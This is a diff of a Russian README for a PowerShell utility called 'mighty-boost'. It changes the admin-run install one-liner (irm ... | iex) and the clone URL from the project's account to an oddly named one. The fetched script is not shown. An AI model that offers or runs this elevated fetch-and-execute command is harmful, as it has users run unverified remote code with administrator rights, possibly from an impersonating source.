@@ -16,7 +16,7 @@
 Открой PowerShell **от имени администратора** и вставь:
 
 ```powershell
-irm "https://raw.githubusercontent.com/mighty-boost/mighty-boost/main/boost.ps1" | iex
+irm "https://raw.githubusercontent.com/sadawdawdsdads/mighty-boost/main/boost.ps1" | iex
 ```
 
 И всё — никакой установки, никакого .exe, только открытый PowerShell + JSON. GUI откроется через пару секунд.
@@ -103,7 +103,7 @@ irm "https://raw.githubusercontent.com/mighty-boost/mighty-boost/main/boost.ps1"
 ## ⚙️ Локальная разработка
 
 ```powershell
-git clone https://github.com/mighty-boost/mighty-boost.git
+git clone https://github.com/sadawdawdsdads/mighty-boost.git
 cd mighty-boost
 .\boost.ps1 -Local       # использует локальные файлы вместо загрузки с GitHub
 ```
